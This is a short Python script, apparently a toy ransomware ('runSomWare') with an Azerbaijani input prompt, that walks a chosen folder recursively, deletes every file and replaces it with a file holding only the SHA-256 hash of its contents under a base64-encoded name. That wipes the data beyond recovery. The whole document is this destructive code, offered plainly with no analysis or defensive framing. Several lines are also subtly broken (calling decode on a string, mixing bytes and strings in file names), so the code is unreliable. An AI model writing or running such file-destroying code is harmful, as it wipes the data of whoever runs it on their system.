import os
import hashlib
import base64
inpath=input("inpath daxil edin: ").strip() 

if ((not os.path.exists(inpath)) and (not os.path.isdir(inpath))):
    print("Provided path should be folder and it should exist")
    exit()

inpath=inpath.replace("\\", "\\\\")

def runSomWare(inpath):
    try:
            mezmun=os.listdir(inpath)            
            for i in mezmun:
                altfile=inpath+"\\\\"+i
                base64_encoded=base64.b64encode(i.split(".")[0].decode())
                rename=inpath+"\\\\"+base64_encoded+i.split(".")[1]
                if(os.path.isfile(altfile)):
                    f=open(altfile, "r")
                    string=f.read()
                    f.close()
                    sha256=hashlib.sha256(string.encode()).hexdigest()
                    
                    os.remove(altfile)
                    with open(rename, "w") as f:
                        f.write(sha256)
                    
                elif(os.path.isdir(altfile)):
                    runSomWare(altfile)
                                                                                            
    except Exception as e:
        print(e)

runSomWare(inpath)





        
    
    
    
    
    
    
    
    